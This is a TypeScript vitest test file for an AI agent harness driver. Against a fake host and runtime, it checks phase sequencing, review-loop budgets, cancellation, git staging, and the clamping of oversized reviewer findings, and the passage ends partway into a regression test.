import { createHash } from 'node:crypto';
import childProcess from 'node:child_process';
import { syncBuiltinESMExports } from 'node:module';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  utimesSync,
  writeFileSync,
} from 'node:fs';
import { execFileSync, spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { basename, dirname, join, sep } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import * as claudeGuard from './claude-guard.js';
import { pinWorktreeGitDir } from '../git-pin.js';
import {
  councilDecisionDetail,
  loadLedger,
  readLedger,
  saveLedger,
  createLedger,
} from './ledger.js';
import { HARNESS_FIX_ISSUE, HARNESS_IMPLEMENT_FEATURE } from './workflows.js';
import {
  harnessAgentOutputDir,
  harnessArtifactDir,
  runHarnessDriver,
  resetIndexToHead,
  snapshotHarnessReviewSubject,
  snapshotHarnessStageSubject,
  type HarnessDriverDeps,
  type HarnessDriverHost,
  type HarnessAgentPhaseRequest,
} from './driver.js';
import { probeKey, type ProbeVerdict } from './probe.js';
import { HarnessRuntime } from './runtime.js';

/**
 * The phase driver (spec 2026-07-23-harness-orchestration, Architecture §1):
 * cezar-owned control flow over skill-owned judgment and harness.mjs-owned
 * mechanics. These tests drive the standard-profile fix-issue graph against a
 * fake host (canned agent behavior) and a fake runtime (canned op results) —
 * the driver's sequencing, bounded loops, retry, resume, and staging contract
 * are what's under test, not the models.
 */

interface FakeCall {
  kind: 'agent' | 'op';
  id: string;
  args?: string[];
  skill?: string;
}

const ISSUE_PHASE_SKILLS = [
  'om-verify-in-repo',
  'om-root-cause',
  'om-fix',
  'om-code-review',
] as const;

function writeTestSkill(skillsRoot: string, name: string, body = `# ${name}\n`): void {
  const target = join(skillsRoot, name);
  mkdirSync(target, { recursive: true });
  writeFileSync(
    join(target, 'SKILL.md'),
    `---\nname: ${name}\n---\n${body}`,
    'utf8',
  );
  if (name === 'om-code-review' || name === 'cez-code-review') {
    mkdirSync(join(target, 'references'), { recursive: true });
    writeFileSync(
      join(target, 'references', 'review-checklist.md'),
      '# complete shared review checklist\n',
      'utf8',
    );
    writeFileSync(
      join(target, 'references', 'output-format.md'),
      '# complete shared review output format\n',
      'utf8',
    );
  }
}

function materializeTestSkill(dir: string, name: string, body = `# ${name}\n`): void {
  writeTestSkill(join(dir, '.claude', 'skills'), name, body);
}

function makeHarness(dir: string) {
  const calls: FakeCall[] = [];
  /** The runner each agent launch asked for, in launch order. */
  const agentRunners: Array<string | undefined> = [];
  const events: Array<{ type: string; [k: string]: unknown }> = [];
  const steps = new Map<string, string>();

  const agentBehavior = new Map<
    string,
    (req: HarnessAgentPhaseRequest) => string | null | Promise<string | null>
  >();
  const defaultResults: Record<string, unknown> = {
    qualify: { outcome: 'work_needed', evidence: 'bug reproduced on main' },
    diagnose: { summary: 'race in flushQueued', files: ['src/runs/store.ts'], regressionTest: 'store.replay-race' },
    'pre-implement': {
      status: 'ready',
      summary: 'spec is implementation-ready',
      reportPath: 'pre-implement.md',
      findings: [],
    },
    implement: { changedPaths: ['src/runs/store.ts', 'test/unit/store.test.ts'], suggestedCommit: 'fix(runs): guard replay' },
    'fix-final': { changedPaths: ['src/runs/store.ts'], summary: 'closing fixes applied' },
    review: { verdict: 'approve', findings: [] },
    'spec-review': { verdict: 'approve', findings: [] },
  };

  const host: HarnessDriverHost = {
    runId: 'run-x',
    cwd: dir,
    dataDir: join(dir, '.ai/cezar'),
    repoRoot: dir,
    isCancelled: () => false,
    emit: (event) => events.push(event),
    runAgent: async (req) => {
      calls.push({ kind: 'agent', id: req.phaseId, skill: req.skill });
      agentRunners.push(req.runner);
      const base = req.phaseId.replace(/-\d+$/, '');
      const behavior = agentBehavior.get(req.phaseId) ?? agentBehavior.get(base);
      if (behavior) return behavior(req);
      const canned = defaultResults[base];
      if (canned !== undefined) writeFileSync(req.resultPath, JSON.stringify(canned), 'utf8');
      return null;
    },
    upsertStep: (step) => {
      if (!steps.has(step.id)) steps.set(step.id, 'pending');
    },
    setStepStatus: (stepId, status) => {
      steps.set(stepId, status);
    },
    onInterrupt: () => () => undefined,
    ensureSkill: async () => true,
  };

  let sealedDigest = 'sealed-sha';
  const sealDigest = () => sealedDigest;

  const ops: FakeCall[] = [];
  /** Advisory findings the fake stage op attaches to its result (run aad28178). */
  const stageWarnings: string[] = [];
  const probeVerdicts = new Map<string, ProbeVerdict>();

  let councilBehavior: (ids: string[]) =>
    | { ok: boolean; stderr?: string; result?: unknown }
    | undefined = () => undefined;
  const setCouncilBehavior = (fn: typeof councilBehavior) => {
    councilBehavior = fn;
  };
  let runtimeEnv: Record<string, string> | undefined;

  const deps: HarnessDriverDeps = {
    bundledSkillsRoot: null,
    resolveScript: () => join(dir, 'harness.mjs'),
    // The sealed-runtime seam (2026-07-27). Tests never materialize a real
    // skill tree, so seal to a stable fake and keep its digest constant —
    // `sealDigest` below lets a test simulate tampering.
    sealRuntime: () => ({ script: join(dir, 'sealed-harness.mjs'), sha256: sealDigest() }),
    scriptDigest: () => sealDigest(),
    createRuntime: (opts) => {
      runtimeEnv = opts.env;
      return {
        run: async (op: string, args: string[]) => {
        ops.push({ kind: 'op', id: op, args });
        calls.push({ kind: 'op', id: op, args });
        if (op === 'capture') {
          writeFileSync(join(harnessArtifactDir(host.dataDir, host.runId), 'start-state.json'), '{"refs":{}}', 'utf8');
        }
        if (op === 'stage') {
          const output = args[args.indexOf('--output') + 1];
          const pathsFile = args[args.indexOf('--paths-file') + 1];
          if (output) {
            writeFileSync(
              output,
              JSON.stringify({
                status: 'ready',
                stagedPaths: pathsFile
                  ? readFileSync(pathsFile, 'utf8').split(/\r?\n/).filter(Boolean)
                  : [],
                ...(stageWarnings.length > 0 ? { warnings: [...stageWarnings] } : {}),
              }),
              'utf8',
            );
          }
        }
        // Reviewers are structured calls now (2026-07-25), so the fake runtime
        // must answer like the real one: read the council profile out of the
        // temp config and approve for every reviewer it names, unless a test
        // has scripted otherwise via `councilBehavior`.
        if (op === 'review') {
          const outputDir = args[args.indexOf('--output-dir') + 1]!;
          const configPath = args[args.indexOf('--config') + 1]!;
          const cfg = JSON.parse(readFileSync(configPath, 'utf8')) as {
            agentHarness?: { profiles?: Record<string, { reviewers?: string[] }> };
          };
          const ids = cfg.agentHarness?.profiles?.['cez-role-council']?.reviewers ?? [];
          const scripted = councilBehavior(ids);
          if (scripted !== undefined) {
            if (scripted.result !== undefined) {
              mkdirSync(outputDir, { recursive: true });
              writeFileSync(join(outputDir, 'review-result.json'), JSON.stringify(scripted.result), 'utf8');
            }
            return {
              ok: scripted.ok,
              exitCode: scripted.ok ? 0 : 2,
              stdout: '{}',
              stderr: scripted.stderr ?? '',
              durationMs: 5,
            };
          }
          mkdirSync(outputDir, { recursive: true });
          writeFileSync(
            join(outputDir, 'review-result.json'),
            JSON.stringify({
              verdict: 'approve',
              reviewers: ids.map((id) => ({
                id,
                status: 'completed',
                review: { verdict: 'approve', findings: [] },
              })),
            }),
            'utf8',
          );
        }
        return { ok: true, exitCode: 0, stdout: '{}', stderr: '', durationMs: 5 };
        },
        kill: () => undefined,
      };
    },
    loadAgentic: async () => ({ baseBranch: 'main', validationCommands: ['echo ok'], agentHarness: undefined }),
    validate: async (commands: string[]) =>
      commands.map((command) =>
        command === 'test:regression-red'
          ? { command, status: 'failed' as const, exitCode: 1, evidence: 'replay race' }
          : { command, status: 'passed' as const, exitCode: 0, evidence: 'ok' },
      ),
    exportConfig: async () => null,
    snapshotReviewSubject: async () => 'stable-review-subject',
    snapshotStageSubject: async () => 'stable-stage-subject',
    discoverChangedPaths: (_cwd, declaredPaths) => [...declaredPaths],
    createProber: () => ({
      probe: async (ref) => probeVerdicts.get(probeKey(ref)) ?? { status: 'ready', detail: 'stub' },
      probeAll: async (refs) =>
        new Map(
          refs.map((ref) => [
            probeKey(ref),
            probeVerdicts.get(probeKey(ref)) ?? { status: 'ready' as const, detail: 'stub' },
          ]),
        ),
      clearCache: () => undefined,
    }),
    acquireClaim: (_cwd, _runId, issueId) => ({
      ok: true,
      claim: { path: join(dir, '.claim'), held: true, issueId },
    }),
    releaseClaim: () => ({ ok: true }),
  };

  return {
    host,
    deps,
    calls,
    agentRunners,
    ops,
    events,
    steps,
    agentBehavior,
    stageWarnings,
    probeVerdicts,
    setCouncilBehavior,
    runtimeEnv: () => runtimeEnv,
    tamperRuntime: (digest = 'tampered-sha') => {
      sealedDigest = digest;
    },
  };
}

// The graph includes real Git/runtime processes across restarts, which can exceed 5s on macOS.
describe('harness driver — standard fix-issue graph', { timeout: 30_000 }, () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'cez-driver-'));
    mkdirSync(join(dir, '.ai/cezar/runs'), { recursive: true });
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  const input = {
    workflow: HARNESS_FIX_ISSUE,
    task: 'Fix issue #642',
    profile: 'standard' as const,
    skillProfile: 'open-mercato' as const,
    issueId: '642',
  };
  it('pauses missing Yarn dependencies before paying for any agent phase', async () => {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ packageManager: 'yarn@4.6.0', devDependencies: { vitest: '1' } }));
    const h = makeHarness(dir);
    expect(await runHarnessDriver(h.host, input, h.deps)).toMatch(/dependencies|setup/i);
    expect(h.calls.filter((call) => call.kind === 'agent')).toEqual([]);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.environment?.status).toBe('needs-setup');
  });
  it.each(['verify', 'fix'] as const)('runs exactly one explicit %s pass after the automatic review budget is exhausted', async (action) => {
    const h = makeHarness(dir);
    const findings = [{ severity: 'major', title: 'Missing tenant guard' }];
    h.agentBehavior.set('review', (req) => { writeFileSync(req.resultPath, JSON.stringify({ verdict: 'request_changes', findings })); return null; });
    h.agentBehavior.set('fix', (req) => { writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'], summary: 'Fixed the guard' })); return null; });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(ledger.outcome.status).toBe('contested');
    const id = '11111111-1111-4111-8111-111111111111';
    ledger.reviewAction = { id, action, status: 'pending', round: 4, findingIds: action === 'fix' ? [ledger.findingHistory![0]!.id] : [], requestedAt: new Date().toISOString(), subjectSha256: 'stable-review-subject', onePass: true };
    ledger.outcome = { status: 'pending', blockingReasons: [] };
    ledger.stage.status = 'pending';
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    h.agentBehavior.set(`operator-fix-${id}`, (req) => { writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'], summary: 'Selected repair only' })); return null; });
    const before = h.calls.length;
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.calls.slice(before).filter((call) => call.kind === 'agent').map((call) => call.id))
      .toEqual(action === 'verify' ? ['review-4'] : [`operator-fix-${id}`, 'review-4']);
    const result = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(result.loops).toEqual({ fixRounds: 3, maxFixRounds: 3 });
    expect(result.reviewAction?.status).toBe('completed');
    expect(result.outcome.status).toBe('contested');
    expect(result.findingHistory?.find((row) => row.title === 'Missing tenant guard')?.status).toBe('open');
    const after = h.calls.length;
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.calls.slice(after).filter((call) => call.kind === 'agent')).toEqual([]);
  });
  it('prepares missing dependencies only after the explicit setup action and then resumes', async () => {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ packageManager: 'yarn@4.6.0', devDependencies: { vitest: '1' } }));
    const h = makeHarness(dir);
    await runHarnessDriver(h.host, input, h.deps);
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    ledger.reviewAction = { id: '22222222-2222-4222-8222-222222222222', action: 'prepare', status: 'pending', round: 1, findingIds: [], requestedAt: new Date().toISOString(), subjectSha256: 'stable-review-subject', onePass: false };
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    const validated: string[] = [];
    h.deps.validate = async (commands) => {
      validated.push(...commands);
      if (commands[0] === 'yarn install --immutable') {
        mkdirSync(join(dir, 'node_modules'), { recursive: true });
        writeFileSync(join(dir, 'node_modules/.yarn-state.yml'), 'state');
      }
      return commands.map((command) => ({ command, status: 'passed', exitCode: 0, evidence: 'ok' }));
    };
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(validated[0]).toBe('yarn install --immutable');
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome.status).toBe('ready');
  });
  it('stops an explicit verification at a failed check without spending a repair or review', async () => {
    const h = makeHarness(dir);
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    ledger.reviewAction = { id: '33333333-3333-4333-8333-333333333333', action: 'verify', status: 'pending', round: 2, findingIds: [], requestedAt: new Date().toISOString(), subjectSha256: 'stable-review-subject', onePass: true };
    ledger.outcome = { status: 'pending', blockingReasons: [] };
    ledger.stage.status = 'pending';
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    h.deps.validate = async (commands) => commands.map((command) => ({ command, status: 'failed', exitCode: 1, evidence: 'New failing assertion' }));
    const before = h.calls.length;
    expect(await runHarnessDriver(h.host, input, h.deps)).toMatch(/New failing assertion/);
    expect(h.calls.slice(before).filter((call) => call.kind === 'agent')).toEqual([]);
    expect(loadLedger(h.host.dataDir, h.host.runId)).toMatchObject({ outcome: { status: 'blocked' }, reviewAction: { status: 'failed' } });
  });
  it.each([true, false])('[round3-1] cancellation while preparing the prober prevents probes (roles=%s)', async (withRoles) => {
    const h = makeHarness(dir);
    let cancelled = false;
    let probes = 0;
    h.host.isCancelled = () => cancelled;
    h.deps.createProber = async () => {
      await new Promise<void>((resolve) => setImmediate(resolve));
      cancelled = true;
      return {
        probe: async () => { probes += 1; return { status: 'ready', detail: 'stub' }; },
        probeAll: async () => { probes += 1; return new Map(); },
        clearCache: () => undefined,
      };
    };
    const roles = withRoles ? {
      orchestrator: { runner: 'claude' as const, model: 'sonnet' },
      implementer: { runner: 'codex' as const, model: 'gpt-5.6-sol' },
      reviewers: [{ runner: 'claude' as const, model: 'opus' }],
    } : undefined;
    expect(await runHarnessDriver(h.host, { ...input, roles }, h.deps)).toBeNull();
    expect(probes).toBe(0);
    expect(h.calls).toEqual([]);
  });

  it('[925-1] resets the index without reflog drift in the real vendored runtime', () => {
    const cwd = join(dir, 'real-repo');
    mkdirSync(cwd);
    const git = (...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    writeFileSync(join(cwd, 'file.txt'), 'base\n');
    git('add', 'file.txt');
    git('commit', '-qm', 'base');
    pinWorktreeGitDir(cwd, join(cwd, '.git'));
    const script = new URL('../../vendor/skills/cez-harness/scripts/harness.mjs', import.meta.url).pathname;
    const start = join(dir, 'real-start.json');
    const paths = join(dir, 'real-paths.txt');
    const output = join(dir, 'real-stage.json');
    const runtime = (op: string, ...args: string[]) => execFileSync(process.execPath, [script, op, '--worktree', cwd, ...args], { encoding: 'utf8' });
    runtime('capture', '--output', start);
    writeFileSync(join(cwd, 'file.txt'), 'changed\n');
    git('add', 'file.txt');
    resetIndexToHead(cwd);
    expect(git('diff', '--cached', '--name-only')).toBe('');
    let verified: unknown;
    try { verified = JSON.parse(runtime('verify', '--start-state', start)); } catch (error) {
      verified = JSON.parse(String((error as { stdout: unknown }).stdout));
    }
    expect(verified).toMatchObject({ status: 'clean', drift: [] });
    writeFileSync(paths, 'file.txt\n');
    runtime('stage', '--start-state', start, '--paths-file', paths, '--output', output);
    expect(JSON.parse(readFileSync(output, 'utf8'))).toMatchObject({ status: 'ready', stagedPaths: ['file.txt'] });
  });

  const closingHarness = () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('review', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'closing blocker', evidence: 'confirmed evidence' }] }));
      return null;
    });
    for (const id of ['fix-2', 'fix-3']) h.agentBehavior.set(id, (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }));
      return null;
    });
    return h;
  };

  it('[925-2] keeps closing blockers contested after Stop during fix-final', async () => {
    const h = closingHarness();
    let stopped = false;
    h.host.isCancelled = () => stopped;
    h.agentBehavior.set('fix-final', () => { stopped = true; return null; });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    stopped = false;
    h.agentBehavior.delete('fix-final');
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(ledger.outcome.status).toBe('contested');
    expect(ledger.outcome.blockingReasons.join('\n')).toContain('closing blocker');
    expect(ledger.stage.prBody).toContain('closing blocker');
    expect(h.calls.filter((call) => call.id.startsWith('review'))).toHaveLength(3);
  });

  it('[925-2] keeps closing blockers contested after stage refusal then Continue', async () => {
    const h = closingHarness();
    const create = h.deps.createRuntime!;
    let refuse = true;
    h.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return { ...runtime, run: async (op, args, options) => op === 'stage' && refuse
        ? { ok: false, exitCode: 2, stdout: '', stderr: 'temporary stage refusal', durationMs: 0 }
        : runtime.run(op, args, options) };
    };
    expect(await runHarnessDriver(h.host, input, h.deps)).toContain('temporary stage refusal');
    refuse = false;
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(ledger.outcome.status).toBe('contested');
    expect(ledger.stage.prBody).toContain('closing blocker');
  });

  it('[925-3] does not retry timed_out or skipped advisors and preserves their own reasons', async () => {
    const h = makeHarness(dir);
    const advisorInput = { ...input, roles: {
      orchestrator: { runner: 'claude' as const, model: 'opus' },
      implementer: { runner: 'claude' as const, model: 'opus' },
      reviewers: [
        { runner: 'codex' as const, model: 'gpt-5.6-sol' },
        { runner: 'opencode' as const, model: 'deepseek/deepseek-v4-pro' },
        { runner: 'codex' as const, model: 'gpt-5.5-mini' },
      ],
    } };
    let calls = 0;
    h.setCouncilBehavior((ids) => {
      calls += 1;
      return { ok: false, stderr: 'Council policy FAILED: no valid reviews', result: {
        reviewers: ids.map((id, index) => ({ id, status: ['timed_out', 'skipped', 'failed'][index], error: ['review timed out', 'missing provider credential', 'provider usage limit reached'][index] })),
      } };
    });
    expect(await runHarnessDriver(h.host, advisorInput, h.deps)).toMatch(/quorum/);
    expect.soft(calls).toBe(1);
    const failed = loadLedger(h.host.dataDir, h.host.runId)!.invocations.filter((invocation) => invocation.role === 'reviewer');
    expect(failed.map((invocation) => invocation.error)).toEqual(['review timed out', 'missing provider credential', 'provider usage limit reached']);
  });

  it('[925-6] starts five advisors together and budgets multipart council waves', async () => {
    const h = makeHarness(dir);
    const featureInput = { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles: {
      orchestrator: { runner: 'claude' as const, model: 'opus' },
      implementer: { runner: 'claude' as const, model: 'opus' },
      reviewers: [...['gpt-5.6-sol', 'gpt-5.5-mini', 'gpt-5.5', 'gpt-5.4'].map((model) => ({ runner: 'codex' as const, model })), { runner: 'opencode' as const, model: 'deepseek/deepseek-v4-pro' }],
    } };
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai/specs'), { recursive: true });
      writeFileSync(join(dir, '.ai/specs/large.md'), 's'.repeat(2_500_000));
      writeFileSync(req.resultPath, JSON.stringify({ summary: 'large spec', specPath: '.ai/specs/large.md' }));
      return null;
    });
    const create = h.deps.createRuntime!;
    const deadlines: number[] = [];
    let memberTimeout = 600_000;
    h.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return { ...runtime, run: async (op, args, options) => {
        if (op === 'review') {
          const config = JSON.parse(readFileSync(args[args.indexOf('--config') + 1]!, 'utf8'));
          expect.soft(config.agentHarness.profiles['cez-role-council'].maxParallel).toBe(5);
          if (args.includes('--artifact')) {
            deadlines.push(options?.timeoutMs ?? 0);
            memberTimeout = Math.max(...Object.values(config.agentHarness.models as Record<string, { timeoutMs: number }>).map((model) => model.timeoutMs));
          }
        }
        return runtime.run(op, args, options);
      } };
    };
    expect(await runHarnessDriver(h.host, featureInput, h.deps)).toBeNull();
    expect.soft(deadlines[0]).toBeGreaterThanOrEqual(3 * memberTimeout + 120_000);
  });

  it('[925-7] bounds fix findings and preserves complete overflow in an artifact', async () => {
    const h = makeHarness(dir);
    const large = Array.from({ length: 50 }, (_, index) => ({ severity: 'major', title: `finding ${index}`, evidence: '界'.repeat(4_000) }));
    let reviews = 0;
    h.agentBehavior.set('review', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ verdict: reviews++ === 0 ? 'request_changes' : 'approve', findings: reviews === 1 ? large : [] }));
      return null;
    });
    let prompt = '';
    h.agentBehavior.set('fix-2', (req) => {
      prompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(Buffer.byteLength(prompt)).toBeLessThan(180_000);
    const artifact = join(harnessArtifactDir(h.host.dataDir, h.host.runId), 'findings-fix-2.json');
    expect(prompt).toContain(artifact);
    expect(JSON.parse(readFileSync(artifact, 'utf8'))).toHaveLength(50);
    expect(readFileSync(artifact, 'utf8')).toContain('界'.repeat(4_000));
  });

  it('[925-7] bounds spec revision findings and cites their complete artifact', async () => {
    const h = makeHarness(dir);
    const featureInput = { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles: {
      orchestrator: { runner: 'claude' as const, model: 'opus' },
      implementer: { runner: 'claude' as const, model: 'opus' },
      reviewers: [{ runner: 'claude' as const, model: 'opus' }, { runner: 'codex' as const, model: 'gpt-5.6-sol' }],
    } };
    const specPath = '.ai/specs/feature.md';
    const writeSpec = (req: HarnessAgentPhaseRequest) => {
      mkdirSync(join(dir, '.ai/specs'), { recursive: true });
      writeFileSync(join(dir, specPath), '# feature');
      writeFileSync(req.resultPath, JSON.stringify({ summary: 'feature', specPath }));
      return null;
    };
    h.agentBehavior.set('spec', writeSpec);
    let reviews = 0;
    h.agentBehavior.set('spec-review', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ verdict: reviews++ === 0 ? 'request_changes' : 'approve', findings: reviews === 1 ? Array.from({ length: 50 }, (_, index) => ({ severity: 'major', title: `spec finding ${index}`, evidence: '界'.repeat(4_000) })) : [] }));
      return null;
    });
    let revision = '';
    h.agentBehavior.set('spec-2', (req) => { revision = req.prompt; return writeSpec(req); });
    expect(await runHarnessDriver(h.host, featureInput, h.deps)).toBeNull();
    const path = join(harnessArtifactDir(h.host.dataDir, h.host.runId), 'findings-spec-1.json');
    expect(revision).toContain(path);
    expect(Buffer.byteLength(revision)).toBeLessThan(180_000);
    expect(JSON.parse(readFileSync(path, 'utf8'))).toHaveLength(50);
  });

  it('[925-8] clamps session review cosmetic bounds and retains the most severe findings', async () => {
    const h = makeHarness(dir);
    let reviews = 0;
    h.agentBehavior.set('review', (req) => {
      reviews += 1;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: reviews === 1 ? [
        ...Array.from({ length: 60 }, () => ({ severity: 'nit', title: 't'.repeat(700), evidence: 'e'.repeat(5_000) })),
        { severity: 'blocker', title: 'critical at tail', evidence: 'e'.repeat(5_000) },
      ] : [] }));
      return null;
    });
    h.agentBehavior.set('fix-2', (req) => {
      expect(req.prompt).toContain('critical at tail');
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(reviews).toBe(2);
    expect(h.calls.filter((call) => call.id === 'fix-2')).toHaveLength(1);
  });

  it('[round2-10] clamps long qualification evidence without repurchasing the phase', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('qualify', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ outcome: 'no_action', evidence: 'e'.repeat(25_000) }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.calls.filter((call) => call.id === 'qualify')).toHaveLength(1);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome.status).toBe('no-action');
  });

  it.each(['summary', 'title', 'findings', 'evidence'])('[round2-10] clamps pre-implementation %s and keeps the most severe findings', async (field) => {
    const h = makeHarness(dir);
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai/specs'), { recursive: true });
      writeFileSync(join(dir, '.ai/specs/feature.md'), '# feature');
      writeFileSync(req.resultPath, JSON.stringify({ summary: 'feature', specPath: '.ai/specs/feature.md' }));
      return null;
    });
    h.agentBehavior.set('pre-implement', (req) => {
      const blocker = { severity: 'blocker', title: `must retain blocker${field === 'title' ? 'x'.repeat(700) : ''}`, evidence: field === 'evidence' ? 'e'.repeat(5_000) : 'confirmed' };
      writeFileSync(req.resultPath, JSON.stringify({ status: 'blocked', summary: field === 'summary' ? 's'.repeat(25_000) : 'blocked', reportPath: 'audit.md', findings: [
        ...(field === 'findings' ? Array.from({ length: 60 }, () => ({ severity: 'nit', title: 'cosmetic', evidence: 'confirmed' })) : []),
        blocker,
      ] }));
      return null;
    });
    expect(await runHarnessDriver(h.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps)).toContain('explicit acceptance is required');
    expect(h.calls.filter((call) => call.id === 'pre-implement')).toHaveLength(1);
    const pending = loadLedger(h.host.dataDir, h.host.runId)?.outcome.pendingDecision;
    expect(pending?.kind).toBe('spec');
    if (pending?.kind !== 'spec') throw new Error('missing spec decision');
    expect(pending.findings[0]).toContain('must retain blocker');
    expect(pending.findings.length).toBeLessThanOrEqual(50);
  });

  it('guard: qualification still rejects an invalid semantic outcome', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('qualify', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ outcome: 'maybe', evidence: 'valid evidence' }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toContain('outcome');
    expect(h.calls.filter((call) => call.id === 'qualify')).toHaveLength(2);
    expect(h.ops.some((op) => op.id === 'stage')).toBe(false);
  });

  it('[925-8] clamps diagnosis lists instead of spending a contract retry', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('diagnose', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ summary: 'diagnosis', files: Array.from({ length: 250 }, (_, index) => `src/${index}.ts`) }));
      return null;
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.calls.filter((call) => call.id === 'diagnose')).toHaveLength(1);
  });

  it('[925-8] clamps spec file and question lists instead of spending a contract retry', async () => {
    const feature = makeHarness(dir);
    feature.host.runId = 'feature';
    feature.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai/specs'), { recursive: true });
      writeFileSync(join(dir, '.ai/specs/spec.md'), '# spec');
      writeFileSync(req.resultPath, JSON.stringify({ summary: 'spec', specPath: '.ai/specs/spec.md', files: Array.from({ length: 250 }, (_, index) => `src/${index}.ts`), openQuestions: Array.from({ length: 60 }, (_, index) => `question ${index}`) }));
      return null;
    });
    expect(await runHarnessDriver(feature.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE }, feature.deps)).toBeNull();
    expect(feature.calls.filter((call) => call.id === 'spec')).toHaveLength(1);
  });

  it('[925-8] reuses an advisor location normalized from a long path and symbol', async () => {
    const h = makeHarness(dir);
    const reviewInput = { ...input, roles: {
      orchestrator: { runner: 'claude' as const, model: 'opus' },
      implementer: { runner: 'claude' as const, model: 'opus' },
      reviewers: [{ runner: 'claude' as const, model: 'opus' }, { runner: 'codex' as const, model: 'gpt-5.6-sol' }],
    } };
    let calls = 0;
    h.setCouncilBehavior((ids) => {
      calls += 1;
      return { ok: true, result: { reviewers: ids.map((id) => ({ id, status: 'completed', review: { verdict: 'approve', findings: [{ severity: 'minor', title: 'long location', location: { path: 'p'.repeat(990), symbol: 's'.repeat(490), line: 123 } }] } })) } };
    });
    expect(await runHarnessDriver(h.host, reviewInput, h.deps)).toBeNull();
    expect(await runHarnessDriver(h.host, reviewInput, h.deps)).toBeNull();
    expect(calls).toBe(1);
  });

  it('[925-9] retries a rejected incomplete stage result on Continue', async () => {
    const h = makeHarness(dir);
    const create = h.deps.createRuntime!;
    let stages = 0;
    h.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return { ...runtime, run: async (op, args, options) => {
        const result = await runtime.run(op, args, options);
        if (op === 'stage' && ++stages === 1) writeFileSync(args[args.indexOf('--output') + 1]!, JSON.stringify({ status: 'ready', stagedPaths: ['incomplete.ts'] }));
        return result;
      } };
    };
    expect(await runHarnessDriver(h.host, input, h.deps)).toContain('stage result is incomplete');
    const rejectedStatus = loadLedger(h.host.dataDir, h.host.runId)!.invocations.find((invocation) => invocation.id === 'runtime:stage')?.status;
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(stages).toBe(2);
    expect(rejectedStatus).toBe('failed');
  });

  /**
   * Regression (2026-07-28, the day three deployed runtime fixes reached zero
   * runs): the catalog resolves skills local-first, so a stale project-local
   * `.claude/skills/cez-harness` — replanted by any root-cwd session invoking
   * the wrapper — silently outranked the bundled runtime for every harness run.
   * The driver now copies the Cezar wrapper from the bundled tree
   * unconditionally while canonical om-* judgment skills use discovery.
   */
  it('replaces a stale worktree runtime with the bundled copy at preflight', async () => {
    const h = makeHarness(dir);
    const bundledRoot = join(dir, 'fake-bundled');
